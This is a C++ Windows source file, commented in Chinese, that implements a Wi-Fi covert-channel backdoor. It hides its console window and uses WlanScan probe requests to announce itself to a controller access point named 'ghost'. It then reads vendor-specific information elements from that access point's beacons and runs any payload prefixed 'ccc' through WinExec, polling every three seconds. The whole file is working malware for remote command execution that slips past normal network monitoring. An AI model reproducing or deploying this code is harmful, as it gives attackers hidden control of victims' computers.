#ifndef UNICODE
#define UNICODE
#endif
#include "stdafx.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>

#include <stdio.h>
#include <stdlib.h>

// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

//payload结构体
struct ie_data
{
	unsigned char id;
	unsigned char len;
	unsigned char val[1];
};

HWND hwnd;
DWORD dwResult, dwCurVersion, dwMaxClient;
HANDLE hClient;

PWLAN_INTERFACE_INFO_LIST pIfList;
PWLAN_INTERFACE_INFO pIfInfo;

PWLAN_AVAILABLE_NETWORK_LIST pBssList;
PWLAN_AVAILABLE_NETWORK pBssEntry;

void init(){

	hwnd = FindWindow(L"ConsoleWindowClass", NULL);

	hClient = NULL;
	dwMaxClient = 2;
	dwCurVersion = 0;
	dwResult = 0;

	pIfList = NULL;			//网卡列表
	pIfInfo = NULL;			//网卡信息

	pBssList = NULL;		//附近网络信息列表
	pBssEntry = NULL;		//AP实体

}

//窗口隐藏函数
void changeWindowStatus(){

	if (hwnd)
	{
		ShowWindow(hwnd, SW_HIDE);
	}
	else
	{
		ShowWindow(hwnd, SW_SHOW);
	}
}


//封装payload
PWLAN_RAW_DATA get_payload(char *buf){
	struct ie_data      *piedata = NULL;
	int         response_len = 0;
	char            *response = NULL;

	int len = strlen(buf);					 //len为数据长度
	//char *buf = "command ok!!!!!!.";		//buf为要发送的数据（最大长度240），

	//结构体初始化
	response_len = sizeof(WLAN_RAW_DATA) - 1 + sizeof(struct ie_data) - 1 + len;
	response = (char *)malloc(response_len);
	memset(response, '\0', response_len);

	//转化为PWLAN_RAW_DATA数据类型
	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;

	//写入payload
	piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
	piedata->id = (char)221;
	piedata->len = len;

	memcpy(&piedata->val[0], buf, len);

	return pwlan_data;
}


//查询网卡状态
bool get_Wlan(){

	WCHAR GuidString[40] = { 0 };

	//打开wlan句柄
	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanOpenHandle failed with error: %u\n", dwResult);
		return false;
	}

	//枚举wlan设备
	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanEnumInterfaces failed with error: %u\n", dwResult);
		return false;
	}
	else {
		//打印wlan设备信息
		wprintf(L"Num Entries: %lu\n", pIfList->dwNumberOfItems);
		wprintf(L"Current Index: %lu\n", pIfList->dwIndex);
		for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
			pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
			wprintf(L"  Interface Index[%d]:\t %lu\n", i, i);
			int iRet = StringFromGUID2(pIfInfo->InterfaceGuid, (LPOLESTR)&GuidString, 39);
			if (iRet == 0)
				wprintf(L"StringFromGUID2 failed\n");
			else {
				wprintf(L"  InterfaceGUID[%d]: %ws\n", i, GuidString);
			}
			wprintf(L"  Interface Description[%d]: %ws", i,
				pIfInfo->strInterfaceDescription);
			wprintf(L"\n");
			wprintf(L"  Interface State[%d]:\t ", i);
			switch (pIfInfo->isState) {
			case wlan_interface_state_not_ready:
				wprintf(L"Not ready\n");
				break;
			case wlan_interface_state_connected:
				wprintf(L"Connected\n");
				break;
			case wlan_interface_state_ad_hoc_network_formed:
				wprintf(L"First node in a ad hoc network\n");
				break;
			case wlan_interface_state_disconnecting:
				wprintf(L"Disconnecting\n");
				break;
			case wlan_interface_state_disconnected:
				wprintf(L"Not connected\n");
				break;
			case wlan_interface_state_associating:
				wprintf(L"Attempting to associate with a network\n");
				break;
			case wlan_interface_state_discovering:
				wprintf(L"Auto configuration is discovering settings for the network\n");
				break;
			case wlan_interface_state_authenticating:
				wprintf(L"In process of authenticating\n");
				break;
			default:
				wprintf(L"Unknown state %ld\n", pIfInfo->isState);
				break;
			}
			wprintf(L"\n");
		}
	}

	return true;

}

//发送探针
bool sendRequest(char *ssid, PWLAN_RAW_DATA pwlan_data){
	PDOT11_SSID pdo = new DOT11_SSID;
	pdo->uSSIDLength = strlen(ssid); //这一部分设置为动态获取
	UCHAR *ucp = NULL;
	ucp = (UCHAR *)&pdo->ucSSID;
	ucp = (UCHAR *)malloc(pdo->uSSIDLength);
	memset(ucp, '\0', pdo->uSSIDLength);
	strcpy_s((char*)ucp, pdo->uSSIDLength * 4, ssid);


	dwResult = WlanScan(hClient, &pIfInfo->InterfaceGuid, NULL, pwlan_data, NULL);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanScan failed with error: %u\n", dwResult);
		return false;
	}
	else {
		printf("已发送上线请求!!\n");
	}
	//释放空间
	free(pdo);
	return true;
}

WLAN_AVAILABLE_NETWORK* getssid(char *ssid){
	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
	//获取可用AP 这里需要修改
	dwResult = WlanGetAvailableNetworkList(hClient,
		&pIfInfo->InterfaceGuid,
		0,
		NULL,
		&pBssList);

	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"WlanGetAvailableNetworkList failed with error: %u\n",
			dwResult);
	}
	else {
		//wprintf(L"WLAN_AVAILABLE_NETWORK_LIST for this interface\n");

		wprintf(L" Num Entries: %lu\n\n", pBssList->dwNumberOfItems);
		for (int j = 0; j < pBssList->dwNumberOfItems; j++) {
			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0){
				printf("找到控制端!\n");
				return pBssEntry;
				//getcmd(pBssEntry, ssid);

			}
		}
	}
	return pBssEntry;
}
void getcmd(WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid){
	PWLAN_BSS_LIST ppWlanBssList;
	DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,
		&pBssEntry->dot11Ssid,
		pBssEntry->dot11BssType,
		pBssEntry->bSecurityEnabled,
		NULL,
		&ppWlanBssList);
	for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
	{
		WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
		//添加判断是否是为目标SSID
		printf("%s", bss_entry->dot11Ssid.ucSSID);
		if (_stricmp((char *)bss_entry->dot11Ssid.ucSSID, ssid) == 0) {

		}
		char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);
		int total_size = bss_entry->ulIeSize;
		//printf("长度：%d",total_size);
		for (;;) {
			ie_data * ie = (struct ie_data *)pp;
			if ((int)ie->id == 221)
			{
				//printf("221!!!!!\n");
				// eg. "ccccmd /c notepad"  
				char *magic = (char *)&ie->val[0];
				printf(magic);
				printf("\n");
				if (strncmp(magic, "ccc", 3) == 0)
				{
					char command[240] = { 0 };
					strncpy_s(command, magic + 3, ie->len - 3);
					//执行命令
					printf("提取命令：%s\n", command);
					WinExec(command, SW_NORMAL);
					exit(1); //退出
					break;
				}
			}
			pp += sizeof(struct ie_data) - 1 + (int)ie->len;
			total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;
			if (!total_size)
			{
				break;  // over  
			}

		}
	}
}
int wmain()
{

	init();

	char *cmd = "command ok";
	PWLAN_RAW_DATA pwlan_data = get_payload(cmd);
	WLAN_AVAILABLE_NETWORK* ssid_entry;
	char * ssid = "ghost";
	while (true) {

		if (!get_Wlan())
			return 1;
		if (!sendRequest("ghost", pwlan_data))
			return 1;
		ssid_entry = getssid(ssid);
		getcmd(ssid_entry, ssid);

		//间隔
		Sleep(3000);
	}

	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}

	if (pIfList != NULL) {
		WlanFreeMemory(pIfList);
		pIfList = NULL;
	}
	return 0;
}
